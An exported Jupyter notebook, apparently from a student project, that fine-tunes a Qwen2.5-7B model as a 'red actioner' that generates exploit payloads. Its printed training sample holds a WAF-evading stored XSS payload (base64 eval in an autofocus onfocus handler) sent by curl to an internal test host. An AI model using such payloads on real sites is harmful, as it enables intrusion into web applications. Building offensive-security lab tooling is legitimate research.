@@ -1,0 +1,856 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jupyter Notebook — generated with runcell</title>
+    <meta name="description" content="Exported with runcell — convert .ipynb notebooks to HTML or PDF anytime at runcell.dev." />
+    <meta name="generator" content="runcell" />
+    <style>
+        :root {
+            --jp-code-font-family: 'SFMono-Regular', Menlo, Consolas, 'Liberation Mono', monospace;
+            --jp-content-font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            --jp-cell-prompt-width: 64px;
+            --jp-input-prompt-color: #307fc1;
+            --jp-output-prompt-color: #bf5b3d;
+            --jp-cell-input-bg: #f7f7f7;
+            --jp-layout-color0: #ffffff;
+            --jp-layout-color1: #f7f7f7;
+            --jp-border-color1: #e0e0e0;
+            --jp-content-font-color0: #000000;
+            --jp-content-font-color1: #333333;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: var(--jp-content-font-family);
+            font-size: 14px;
+            line-height: 1.5;
+            color: var(--jp-content-font-color0);
+            background-color: var(--jp-layout-color0);
+            margin: 0;
+            padding: 0;
+        }
+
+        .notebook-container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* Cell structure */
+        .cell {
+            display: flex;
+            flex-direction: row;
+            margin-bottom: 12px;
+            position: relative;
+        }
+
+        .cell-prompt {
+            min-width: var(--jp-cell-prompt-width);
+            width: var(--jp-cell-prompt-width);
+            font-family: var(--jp-code-font-family);
+            font-size: 12px;
+            padding: 10px 8px 10px 0;
+            text-align: right;
+            flex-shrink: 0;
+            user-select: none;
+        }
+
+        .cell-content {
+            flex: 1;
+            min-width: 0;
+            overflow: hidden;
+        }
+
+        /* Input prompt styling - Jupyter blue */
+        .input-prompt {
+            color: var(--jp-input-prompt-color);
+            font-weight: bold;
+        }
+
+        /* Output prompt styling - Jupyter red/orange */
+        .output-prompt {
+            color: var(--jp-output-prompt-color);
+            font-weight: bold;
+        }
+
+        /* Code cell input area */
+        .input-area {
+            background-color: var(--jp-cell-input-bg);
+            border: 1px solid var(--jp-border-color1);
+            border-radius: 2px;
+            padding: 8px 12px;
+            overflow-x: auto;
+        }
+
+        .input-area pre {
+            margin: 0;
+            font-family: var(--jp-code-font-family);
+            font-size: 13px;
+            line-height: 1.4;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        /* Output area */
+        .output-area {
+            margin-top: 0;
+        }
+
+        .output-wrapper {
+            display: flex;
+            flex-direction: row;
+            margin-top: 4px;
+        }
+
+        .output-content {
+            flex: 1;
+            min-width: 0;
+            padding: 8px 0;
+        }
+
+        .output-content pre {
+            margin: 0;
+            font-family: var(--jp-code-font-family);
+            font-size: 13px;
+            line-height: 1.4;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        /* Stream output (stdout/stderr) */
+        .output-stream {
+            font-family: var(--jp-code-font-family);
+            font-size: 13px;
+            line-height: 1.4;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        .output-stderr {
+            background-color: #fdd;
+            padding: 8px 12px;
+            border-radius: 2px;
+        }
+
+        /* Execute result / display data */
+        .output-result {
+            padding: 4px 0;
+        }
+
+        .output-result pre {
+            margin: 0;
+            font-family: var(--jp-code-font-family);
+            font-size: 13px;
+        }
+
+        /* Image output */
+        .output-image {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        /* HTML output (DataFrames, etc.) */
+        .output-html {
+            overflow-x: auto;
+        }
+
+        .output-html table {
+            border-collapse: collapse;
+            font-size: 13px;
+            font-family: var(--jp-content-font-family);
+        }
+
+        .output-html table th,
+        .output-html table td {
+            border: 1px solid #ddd;
+            padding: 6px 10px;
+            text-align: left;
+        }
+
+        .output-html table th {
+            background-color: #f5f5f5;
+            font-weight: 600;
+        }
+
+        .output-html table tr:nth-child(even) {
+            background-color: #fafafa;
+        }
+
+        /* Error output */
+        .output-error {
+            background-color: #fff0f0;
+            padding: 8px 12px;
+            border-radius: 2px;
+            font-family: var(--jp-code-font-family);
+            font-size: 13px;
+            white-space: pre-wrap;
+        }
+
+        /* Markdown cell styling */
+        .markdown-cell {
+            padding: 10px 0;
+        }
+
+        .markdown-cell h1 {
+            font-size: 2em;
+            font-weight: 600;
+            margin: 0.67em 0;
+            padding-bottom: 0.3em;
+            border-bottom: 1px solid var(--jp-border-color1);
+        }
+
+        .markdown-cell h2 {
+            font-size: 1.5em;
+            font-weight: 600;
+            margin: 0.83em 0;
+            padding-bottom: 0.3em;
+            border-bottom: 1px solid var(--jp-border-color1);
+        }
+
+        .markdown-cell h3 {
+            font-size: 1.25em;
+            font-weight: 600;
+            margin: 1em 0;
+        }
+
+        .markdown-cell h4 {
+            font-size: 1em;
+            font-weight: 600;
+            margin: 1.33em 0;
+        }
+
+        .markdown-cell h5 {
+            font-size: 0.875em;
+            font-weight: 600;
+            margin: 1.67em 0;
+        }
+
+        .markdown-cell h6 {
+            font-size: 0.85em;
+            font-weight: 600;
+            margin: 2.33em 0;
+            color: #6a737d;
+        }
+
+        .markdown-cell p {
+            margin: 0 0 16px 0;
+            line-height: 1.6;
+        }
+
+        .markdown-cell code {
+            font-family: var(--jp-code-font-family);
+            font-size: 85%;
+            background-color: rgba(27, 31, 35, 0.05);
+            padding: 0.2em 0.4em;
+            border-radius: 3px;
+        }
+
+        .markdown-cell pre {
+            background-color: var(--jp-cell-input-bg);
+            border: 1px solid var(--jp-border-color1);
+            border-radius: 3px;
+            padding: 16px;
+            overflow-x: auto;
+            font-size: 85%;
+            line-height: 1.45;
+        }
+
+        .markdown-cell pre code {
+            background-color: transparent;
+            padding: 0;
+            border-radius: 0;
+            font-size: 100%;
+        }
+
+        .markdown-cell blockquote {
+            margin: 0 0 16px 0;
+            padding: 0 1em;
+            color: #6a737d;
+            border-left: 4px solid #dfe2e5;
+        }
+
+        .markdown-cell ul,
+        .markdown-cell ol {
+            margin: 0 0 16px 0;
+            padding-left: 2em;
+        }
+
+        .markdown-cell li {
+            margin: 0.25em 0;
+        }
+
+        .markdown-cell a {
+            color: #0366d6;
+            text-decoration: none;
+        }
+
+        .markdown-cell a:hover {
+            text-decoration: underline;
+        }
+
+        .markdown-cell hr {
+            border: 0;
+            border-top: 1px solid var(--jp-border-color1);
+            margin: 24px 0;
+        }
+
+        .markdown-cell img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        .markdown-cell table {
+            border-collapse: collapse;
+            margin: 0 0 16px 0;
+        }
+
+        .markdown-cell table th,
+        .markdown-cell table td {
+            border: 1px solid #dfe2e5;
+            padding: 6px 13px;
+        }
+
+        .markdown-cell table th {
+            font-weight: 600;
+            background-color: #f6f8fa;
+        }
+
+        .markdown-cell table tr:nth-child(2n) {
+            background-color: #f6f8fa;
+        }
+
+        /* Raw cell styling */
+        .raw-cell {
+            background-color: var(--jp-layout-color1);
+            border: 1px solid var(--jp-border-color1);
+            border-radius: 2px;
+            padding: 8px 12px;
+            font-family: var(--jp-code-font-family);
+            font-size: 13px;
+            white-space: pre-wrap;
+        }
+
+        /* Empty prompt placeholder */
+        .prompt-empty {
+            color: transparent;
+        }
+
+        .export-footer {
+            margin-top: 32px;
+            padding-top: 16px;
+            border-top: 1px solid var(--jp-border-color1);
+            color: #555;
+            font-size: 13px;
+            text-align: center;
+        }
+
+        .export-footer a {
+            color: #0366d6;
+            text-decoration: none;
+        }
+
+        .export-footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="notebook-container">
+        <div class="cell cell-markdown">
+            <div class="cell-prompt prompt-empty">&nbsp;</div>
+            <div class="cell-content">
+                <div class="markdown-cell"><h1>HackOps LLM Actioner: Fine-Tuning Pipeline</h1><br><h3>Model: Self-RedTeam-Qwen2.5-7B-Instruct</h3><br>This notebook implements the full SFT pipeline for the HackOps tactical actioner. Optimized for <strong>8GB VRAM</strong> using QLoRA.<br><br>---</div>
+            </div>
+        </div>
+        <div class="cell cell-markdown">
+            <div class="cell-prompt prompt-empty">&nbsp;</div>
+            <div class="cell-content">
+                <div class="markdown-cell"><h2>1. Setup & Dependencies</h2><br>Install required libraries and load environment variables (including HuggingFace Token).</div>
+            </div>
+        </div>
+        <div class="cell cell-code">
+            <div class="cell-prompt input-prompt">In [6]:</div>
+            <div class="cell-content">
+                <div class="input-area"><pre>import os
+
+os.environ["PYTHONUTF8"] = "1"
+
+import torch
+import json
+from dotenv import load_dotenv
+
+load_dotenv(os.path.join(os.getcwd(), '..', '.env'))
+token = os.environ.get("HUGGINGFACE_TOKEN")
+
+print(f"GPU Available: {torch.cuda.is_available()}")
+print(f"GPU Name: {torch.cuda.get_device_name(0) if torch.cuda.is_available() else 'None'}")
+</pre></div>
+                <div class="output-area">
+                    <div class="output-wrapper">
+                        <div class="cell-prompt output-prompt"></div>
+                        <div class="output-content">
+                            <div class="output-stream">GPU Available: True
+GPU Name: NVIDIA GeForce RTX 4060 Laptop GPU
+</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="cell cell-markdown">
+            <div class="cell-prompt prompt-empty">&nbsp;</div>
+            <div class="cell-content">
+                <div class="markdown-cell"><h2>2. Data Preparation</h2><br>Convert distilled JSONL logic into structured <code><think> ... </think></code> and <code><answer> ... </answer></code> pairs.</div>
+            </div>
+        </div>
+        <div class="cell cell-code">
+            <div class="cell-prompt input-prompt">In [7]:</div>
+            <div class="cell-content">
+                <div class="input-area"><pre>from prepare_training_data import prepare_data
+import json
+
+input_path = "data/red_actioner_distilled.jsonl"
+output_prefix = "data/red_actioner_sft"
+
+prepare_data(input_path, output_prefix)
+
+with open(f"{output_prefix}_train.json", "r") as f:
+    sample = json.load(f)[0]
+    print("\n--- SAMPLE FORMATTED DATA ---")
+    print(json.dumps(sample, indent=2))</pre></div>
+                <div class="output-area">
+                    <div class="output-wrapper">
+                        <div class="cell-prompt output-prompt"></div>
+                        <div class="output-content">
+                            <div class="output-stream">Prepared 72 training samples and 8 evaluation samples.
+Files saved: data/red_actioner_sft_train.json, data/red_actioner_sft_eval.json
+
+--- SAMPLE FORMATTED DATA ---
+{
+  "messages": [
+    {
+      "role": "system",
+      "content": "You are HackOps Red Actioner, a cybersecurity expert created by Alibaba Cloud. You generate precise exploit payloads based on observable evidence. The user provides a task, and you solve it. You first think about the reasoning process in the mind and then provide the answer. The reasoning process and answer are enclosed within &lt;think&gt; &lt;/think&gt; and &lt;answer&gt; &lt;/answer&gt; tags, respectively."
+    },
+    {
+      "role": "user",
+      "content": "User: Generate an exploit payload.\n\nTarget URL: http://hackops.corp.internal/xss/480\nTarget Parameter: comment\nHTTP Method: POST\nObservable Context: {\"form_html\": \"&lt;form action=\\\"/xss/480\\\" method=\\\"POST\\\"&gt;\\n  &lt;textarea name=\\\"comment\\\" placeholder=\\\"Leave your comment here...\\\"&gt;&lt;/textarea&gt;\\n  &lt;button type=\\\"submit\\\"&gt;Submit Comment&lt;/button&gt;\\n&lt;/form&gt;\\n&lt;div id=\\\"comments-section\\\"&gt;&lt;/div&gt;\", \"server_headers\": {\"Server\": \"Apache/2.4.41 (Ubuntu)\", \"X-Powered-By\": \"Express\", \"Content-Type\": \"text/html; charset=utf-8\"}, \"fuzz_signal\": \"REFL_DETECTED\", \"logic_clue\": \"Submitting a simple &lt;script&gt;alert(1)&lt;/script&gt; results in a WAF blocking the request (HTTP 403). The submitted comment is later displayed on a public page within a `&lt;div&gt;` element.\"}\nEvasion Level: waf_bypass\nBackend Hint: N/A"
+    },
+    {
+      "role": "assistant",
+      "content": "Let's think step by step.\n&lt;think&gt; The 'REFL_DETECTED' signal indicates a stored XSS vulnerability in the 'comment' parameter. The 'logic_clue' explicitly states that a WAF is blocking standard script tags. To bypass this, I will use an attribute-based XSS payload that leverages an HTML element's event handler. The `&lt;input autofocus onfocus=\"...\"&gt;` tag is effective because `autofocus` ensures the `onfocus` event fires automatically upon page load, making it a reliable stored XSS vector. For WAF evasion, the JavaScript payload `alert(1)` will be Base64 encoded (`YWxlcnQoMSk=`) and then decoded and executed using `eval(atob('...'))`. This technique hides the malicious string from signature-based WAFs that might detect `alert` or `window.alert` directly. &lt;/think&gt;\n&lt;answer&gt; {\"tool\": \"curl\", \"command\": \"curl -X POST -d 'comment=%3Cinput%20autofocus%20onfocus%3D%22eval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%22%3E' http://hackops.corp.internal/xss/480\", \"raw_payload\": \"&lt;input autofocus onfocus=\\\"eval(atob('YWxlcnQoMSk='))\\\"&gt;\", \"encoding\": \"URL\", \"attack_class\": \"stored_xss\", \"confidence\": 0.98} &lt;/answer&gt;"
+    }
+  ]
+}
+</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="cell cell-markdown">
+            <div class="cell-prompt prompt-empty">&nbsp;</div>
+            <div class="cell-content">
+                <div class="markdown-cell"><h2>3. QLoRA Training Loop</h2><br>Fine-tuning the 7B model on 8GB VRAM.</div>
+            </div>
+        </div>
+        <div class="cell cell-code">
+            <div class="cell-prompt input-prompt">In [14]:</div>
+            <div class="cell-content">
+                <div class="input-area"><pre>import pandas as pd
+import os
+import torch
+import gc
+from trl import SFTConfig, SFTTrainer
+
+# 0. CLEAN VRAM BEFORE STARTING
+print("Cleaning VRAM...")
+gc.collect()
+torch.cuda.empty_cache()
+if torch.cuda.is_available():
+    torch.cuda.reset_peak_memory_stats()
+    print(f"Initial VRAM usage: {torch.cuda.memory_allocated() / 1024**2:.2f} MB")
+
+from transformers import AutoModelForCausalLM, AutoTokenizer, BitsAndBytesConfig, TrainingArguments, TrainerCallback
+from peft import LoraConfig, get_peft_model, prepare_model_for_kbit_training
+from datasets import load_dataset
+
+MODEL_NAME = "mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct"
+OUTPUT_DIR = "checkpoints/red_actioner_7b"
+LOG_DIR = "logs/red_actioner"
+
+os.makedirs(LOG_DIR, exist_ok=True)
+output_prefix = "data/red_actioner_sft"
+
+# 1. Load Data
+dataset = load_dataset("json", data_files={"train": f"{output_prefix}_train.json", "test": f"{output_prefix}_eval.json"})
+
+# 2. Quantization Config - Switched to BFloat16 for RTX 4060
+bnb_config = BitsAndBytesConfig(
+    load_in_4bit=True,
+    bnb_4bit_quant_type="nf4",
+    bnb_4bit_compute_dtype=torch.bfloat16, # &lt;-- Changed to bfloat16
+    bnb_4bit_use_double_quant=True,
+)
+
+# 3. Model &amp; Tokenizer
+tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME, token=token)
+tokenizer.pad_token = tokenizer.eos_token
+
+print("Loading model to GPU...")
+model = AutoModelForCausalLM.from_pretrained(
+    MODEL_NAME, 
+    quantization_config=bnb_config, 
+    device_map={"": 0}, 
+    token=token
+)
+model = prepare_model_for_kbit_training(model)
+
+# 4. PEFT Config
+peft_config = LoraConfig(
+    lora_alpha=32, r=16, lora_dropout=0.05, task_type="CAUSAL_LM",
+    target_modules=["q_proj", "k_proj", "v_proj", "o_proj", "gate_proj", "up_proj", "down_proj"]
+)
+model = get_peft_model(model, peft_config)
+
+class ResultsCallback(TrainerCallback):
+    def on_log(self, args, state, control, logs=None, **kwargs):
+        if logs and "loss" in logs:
+            pd.DataFrame([logs]).assign(step=state.global_step).to_csv(f"{LOG_DIR}/results.csv", mode='a', header=not os.path.exists(f"{LOG_DIR}/results.csv"), index=False)
+
+# 5. Training Args - Using BF16 for RTX 4060 compatibility
+args = SFTConfig(
+    output_dir=OUTPUT_DIR, 
+    num_train_epochs=3, 
+    per_device_train_batch_size=1, 
+    gradient_accumulation_steps=4, 
+    learning_rate=2e-4, 
+    bf16=True,                       # &lt;-- Changed to True
+    fp16=False,                      # &lt;-- Changed to False
+    logging_steps=1,                 
+    eval_strategy="steps", 
+    eval_steps=5,                   
+    save_steps=10,
+    logging_strategy="steps",
+    report_to="none",                
+    lr_scheduler_type="cosine",
+    max_grad_norm=0.3,
+    disable_tqdm=False,
+    dataset_text_field="messages",
+    max_length=512
+)
+
+trainer = SFTTrainer(
+    model=model, 
+    train_dataset=dataset["train"], 
+    eval_dataset=dataset["test"],
+    args=args,
+    processing_class=tokenizer,
+    callbacks=[ResultsCallback()]
+)
+
+print("Starting fine-tuning. Monitor the progress bar below for Loss and Learning Rate.")
+trainer.train()
+trainer.model.save_pretrained(f"{OUTPUT_DIR}/final_lora")
+</pre></div>
+                <div class="output-area">
+                    <div class="output-wrapper">
+                        <div class="cell-prompt output-prompt"></div>
+                        <div class="output-content">
+                            <div class="output-stream">Cleaning VRAM...
+Initial VRAM usage: 7707.58 MB
+Loading model to GPU...
+</div>
+                        </div>
+                    </div>
+                    <div class="output-wrapper">
+                        <div class="cell-prompt output-prompt"></div>
+                        <div class="output-content">
+                            <div class="output-result"><pre>Loading weights:   0%|          | 0/339 [00:00&lt;?, ?it/s]</pre></div>
+                        </div>
+                    </div>
+                    <div class="output-wrapper">
+                        <div class="cell-prompt output-prompt"></div>
+                        <div class="output-content">
+                            <div class="output-stream output-stderr">The tokenizer has new PAD/BOS/EOS tokens that differ from the model config and generation config. The model config and generation config were aligned accordingly, being updated with the tokenizer's values. Updated tokens: {'bos_token_id': None, 'pad_token_id': 151645}.
+</div>
+                        </div>
+                    </div>
+                    <div class="output-wrapper">
+                        <div class="cell-prompt output-prompt"></div>
+                        <div class="output-content">
+                            <div class="output-stream">Starting fine-tuning. Monitor the progress bar below for Loss and Learning Rate.
+</div>
+                        </div>
+                    </div>
+                    <div class="output-wrapper">
+                        <div class="cell-prompt output-prompt"></div>
+                        <div class="output-content">
+                            <div class="output-html">
+    <div>
+      
+      <progress value='54' max='54' style='width:300px; height:20px; vertical-align: middle;'></progress>
+      [54/54 3:15:00, Epoch 3/3]
+    </div>
+    <table border="1" class="dataframe">
+  <thead>
+ <tr style="text-align: left;">
+      <th>Step</th>
+      <th>Training Loss</th>
+      <th>Validation Loss</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>5</td>
+      <td>1.466293</td>
+      <td>1.261445</td>
+    </tr>
+    <tr>
+      <td>10</td>
+      <td>0.852571</td>
+      <td>0.724347</td>
+    </tr>
+    <tr>
+      <td>15</td>
+      <td>0.698925</td>
+      <td>0.626861</td>
+    </tr>
+    <tr>
+      <td>20</td>
+      <td>0.446191</td>
+      <td>0.596514</td>
+    </tr>
+    <tr>
+      <td>25</td>
+      <td>0.451309</td>
+      <td>0.584310</td>
+    </tr>
+    <tr>
+      <td>30</td>
+      <td>0.340564</td>
+      <td>0.565661</td>
+    </tr>
+    <tr>
+      <td>35</td>
+      <td>0.467971</td>
+      <td>0.557888</td>
+    </tr>
+    <tr>
+      <td>40</td>
+      <td>0.258298</td>
+      <td>0.557468</td>
+    </tr>
+    <tr>
+      <td>45</td>
+      <td>0.387431</td>
+      <td>0.560757</td>
+    </tr>
+    <tr>
+      <td>50</td>
+      <td>0.358564</td>
+      <td>0.560384</td>
+    </tr>
+    <tr>
+      <td>54</td>
+      <td>0.335888</td>
+      <td>0.560723</td>
+    </tr>
+  </tbody>
+</table><p></div>
+                        </div>
+                    </div>
+                    <div class="output-wrapper">
+                        <div class="cell-prompt output-prompt"></div>
+                        <div class="output-content">
+                            <div class="output-stream output-stderr">d:\graduation_project\HackOps\api\venv\lib\site-packages\peft\utils\other.py:1419: UserWarning: Unable to fetch remote file due to the following error 401 Client Error. (Request ID: Root=1-69e547c8-48c5218d2e837bd85f8e2452;b5e66621-944f-4f09-b414-c52f881b911d)
+
+Cannot access gated repo for url https://huggingface.co/mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct/resolve/main/config.json.
+Access to model mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct is restricted. You must have access to it and be authenticated to access it. Please log in. - silently ignoring the lookup for the file config.json in mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct.
+  warnings.warn(
+d:\graduation_project\HackOps\api\venv\lib\site-packages\peft\utils\save_and_load.py:372: UserWarning: Could not find a config file in mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct - will assume that the vocabulary was not modified.
+  warnings.warn(
+d:\graduation_project\HackOps\api\venv\lib\site-packages\peft\utils\other.py:1419: UserWarning: Unable to fetch remote file due to the following error 401 Client Error. (Request ID: Root=1-69e5508c-02f353981ac523870f717db4;05c21126-c3a8-4c0f-bc69-0f7e9d1d8df9)
+
+Cannot access gated repo for url https://huggingface.co/mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct/resolve/main/config.json.
+Access to model mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct is restricted. You must have access to it and be authenticated to access it. Please log in. - silently ignoring the lookup for the file config.json in mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct.
+  warnings.warn(
+d:\graduation_project\HackOps\api\venv\lib\site-packages\peft\utils\save_and_load.py:372: UserWarning: Could not find a config file in mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct - will assume that the vocabulary was not modified.
+  warnings.warn(
+d:\graduation_project\HackOps\api\venv\lib\site-packages\peft\utils\other.py:1419: UserWarning: Unable to fetch remote file due to the following error 401 Client Error. (Request ID: Root=1-69e55961-4d9e119762c331127036e27e;906e01c0-db35-4fd9-a3a2-adb7f0eaaf22)
+
+Cannot access gated repo for url https://huggingface.co/mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct/resolve/main/config.json.
+Access to model mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct is restricted. You must have access to it and be authenticated to access it. Please log in. - silently ignoring the lookup for the file config.json in mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct.
+  warnings.warn(
+d:\graduation_project\HackOps\api\venv\lib\site-packages\peft\utils\save_and_load.py:372: UserWarning: Could not find a config file in mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct - will assume that the vocabulary was not modified.
+  warnings.warn(
+d:\graduation_project\HackOps\api\venv\lib\site-packages\peft\utils\other.py:1419: UserWarning: Unable to fetch remote file due to the following error 401 Client Error. (Request ID: Root=1-69e5622c-6cf92c7d28af040a32d79981;5553a9ad-f479-4a0d-906f-4d1ae2a3243b)
+
+Cannot access gated repo for url https://huggingface.co/mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct/resolve/main/config.json.
+Access to model mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct is restricted. You must have access to it and be authenticated to access it. Please log in. - silently ignoring the lookup for the file config.json in mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct.
+  warnings.warn(
+d:\graduation_project\HackOps\api\venv\lib\site-packages\peft\utils\save_and_load.py:372: UserWarning: Could not find a config file in mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct - will assume that the vocabulary was not modified.
+  warnings.warn(
+d:\graduation_project\HackOps\api\venv\lib\site-packages\peft\utils\other.py:1419: UserWarning: Unable to fetch remote file due to the following error 401 Client Error. (Request ID: Root=1-69e56b0e-01f593cc05e1ae985c99bc30;a24f03e4-5cd1-4c8d-b6d3-b1d778e3f5cb)
+
+Cannot access gated repo for url https://huggingface.co/mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct/resolve/main/config.json.
+Access to model mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct is restricted. You must have access to it and be authenticated to access it. Please log in. - silently ignoring the lookup for the file config.json in mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct.
+  warnings.warn(
+d:\graduation_project\HackOps\api\venv\lib\site-packages\peft\utils\save_and_load.py:372: UserWarning: Could not find a config file in mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct - will assume that the vocabulary was not modified.
+  warnings.warn(
+d:\graduation_project\HackOps\api\venv\lib\site-packages\peft\utils\other.py:1419: UserWarning: Unable to fetch remote file due to the following error 401 Client Error. (Request ID: Root=1-69e56eb6-1fba46a05f88aca2085ad3c5;b115c362-52fd-45ee-9bc0-1e4ff96b491a)
+
+Cannot access gated repo for url https://huggingface.co/mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct/resolve/main/config.json.
+Access to model mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct is restricted. You must have access to it and be authenticated to access it. Please log in. - silently ignoring the lookup for the file config.json in mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct.
+  warnings.warn(
+d:\graduation_project\HackOps\api\venv\lib\site-packages\peft\utils\save_and_load.py:372: UserWarning: Could not find a config file in mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct - will assume that the vocabulary was not modified.
+  warnings.warn(
+d:\graduation_project\HackOps\api\venv\lib\site-packages\peft\utils\other.py:1419: UserWarning: Unable to fetch remote file due to the following error 401 Client Error. (Request ID: Root=1-69e56eb7-012380447dea70777b9b2216;60fe266a-702b-4b44-bcb0-a6be5cdac0f1)
+
+Cannot access gated repo for url https://huggingface.co/mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct/resolve/main/config.json.
+Access to model mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct is restricted. You must have access to it and be authenticated to access it. Please log in. - silently ignoring the lookup for the file config.json in mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct.
+  warnings.warn(
+d:\graduation_project\HackOps\api\venv\lib\site-packages\peft\utils\save_and_load.py:372: UserWarning: Could not find a config file in mickelliu/Self-RedTeam-Qwen2.5-7B-Instruct - will assume that the vocabulary was not modified.
+  warnings.warn(
+</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="cell cell-markdown">
+            <div class="cell-prompt prompt-empty">&nbsp;</div>
+            <div class="cell-content">
+                <div class="markdown-cell"><h2>4. Evaluation & Visualization</h2><br>Plot the loss curves and compare metrics.</div>
+            </div>
+        </div>
+        <div class="cell cell-code">
+            <div class="cell-prompt input-prompt">In [15]:</div>
+            <div class="cell-content">
+                <div class="input-area"><pre>import matplotlib.pyplot as plt
+df = pd.read_csv(f"{LOG_DIR}/results.csv")
+plt.plot(df['step'], df['loss'], label='Loss')
+plt.title("HackOps Fine-Tuning Loss")
+plt.xlabel("Step"); plt.ylabel("Loss"); plt.legend(); plt.show()</pre></div>
+                <div class="output-area">
+                    <div class="output-wrapper">
+                        <div class="cell-prompt output-prompt"></div>
+                        <div class="output-content">
+                            <img class="output-image" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAjcAAAHHCAYAAABDUnkqAAAAOnRFWHRTb2Z0d2FyZQBNYXRwbG90bGliIHZlcnNpb24zLjEwLjgsIGh0dHBzOi8vbWF0cGxvdGxpYi5vcmcvwVt1zgAAAAlwSFlzAAAPYQAAD2EBqD+naQAAXZ1JREFUeJzt3Qd0VNXWwPGdHgIkdELovfcOKigIdhB7A3vDgvj0EwtYHyrPLgI2UFFBVMBOkd57751AQicJIY1kvrVPMkN6JslMZjLz/6015k6/czNyd87Zex8fi8ViEQAAAA/h6+odAAAAcCSCGwAA4FEIbgAAgEchuAEAAB6F4AYAAHgUghsAAOBRCG4AAIBHIbgBAAAeheAGAAB4FIIboBTp3bu3tGrVSjzRgQMHxMfHRyZNmiSe7t5775V69eq5ejcAj0VwAxSCnnj1BLxmzRq3Dz5SUlLk448/ls6dO0v58uWlXLlyZltv0/tcdexyu7zwwgviCnntT/bLggULxFO403cUcBZ/p70yAJeJj4+Xa6+9VhYuXCjXXXedGSnw9fWVf/75R55++mn59ddf5c8//5SyZcuW+L69/vrrUr9+/Sy36cm2bt26kpCQIAEBASW2L999912W699++63MmTMnx+3Nmzd36Pt+8cUXkpaW5tDXBHARwQ3ggYYPH24Cm08++USeeOIJ2+2PPfaYjB071tz2n//8R8aNG1fi+3b11VdLp06dcr0vODi4RPfl7rvvznJ9xYoVJrjJfrujlWQAB3gjpqUAJ5s4caJcccUVUq1aNQkKCpIWLVrkGVT8/fff0qtXLzONFBoaaqaRfvjhh3xff/bs2RISEiJ33HGHXLhwQSIjI+Wrr74y75k5sLEaOnSoXH755fLll1+ax1rp9Is+/vvvv5emTZuaQKNjx46yaNGiLM+Pi4uTYcOGmZwR/Tz6ua688kpZt26dODrnRkecdDrtyJEjMnDgQLNdtWpVE5ilpqZmeb6OhHz44YfSsmVLs+/Vq1eXRx55RM6cOVOs/dLPqfuR2/SOXqx06kr3/6effpK33npLatWqZfajT58+smfPnnxzbqyf/X//+598/vnn0rBhQ3Ns9fe/evXqHO89bdo08z3S19dRr+nTpzs8j+ezzz4zx1L3IyIiwnxvzp49m+Uxu3fvlptuuknCw8PNvuhnvv322yUmJsb2GA0WL7nkEqlQoYL5/el368UXX3TYfgK5YeQGKAL9x/vkyZM5bs8tl0UDGT1J3HDDDeLv7y+///67PP744+ZkrCcMKz2p33///eaxI0aMMCeD9evXm6mkO++8M9f9+OOPP+Tmm2+W2267Tb7++mvx8/MzAZKe+AcPHpzn/ut98+fPN6/94IMP2m7X0Z6pU6fKU089ZU5qeoK76qqrZNWqVbY8jUcffVR+/vlnEwjpCfbUqVOyZMkS2b59u3To0KFIx65KlSp5Pl4/S//+/aVr167m5D937lx57733TACgI1FWGsjoMbzvvvvM/u/fv18+/fRTcwyXLl1aYqMlb7/9tpkC1ABMP+u7774rd911l6xcubLA52ogq8GjfhYNdvS5gwYNkn379tn2X6cT9ffdunVrGT16tAneHnjgAalZs6bDPsOrr74qr732mvTt29cc4507d5rvsQZa1mOZnJxsfi9JSUny5JNPmgBHg1D9TmoQFBYWJlu3bjXTom3atDHTkfqd0kBPXwNwKgsAu02cONGi/9vkd2nZsmWW55w/fz7H6/Tv39/SoEED2/WzZ89aypcvb+nataslISEhy2PT0tJs27169bK9/i+//GIJCAiwPPTQQ5bU1FTbY4YNG2b2Y/369Xl+jnXr1pnHDB8+3Habdf/XrFlju+3gwYOW4OBgy4033mi7LSwszDJ06FCLI4+d2r9/v9nWx1kNGTLE3Pb6669nea327dtbOn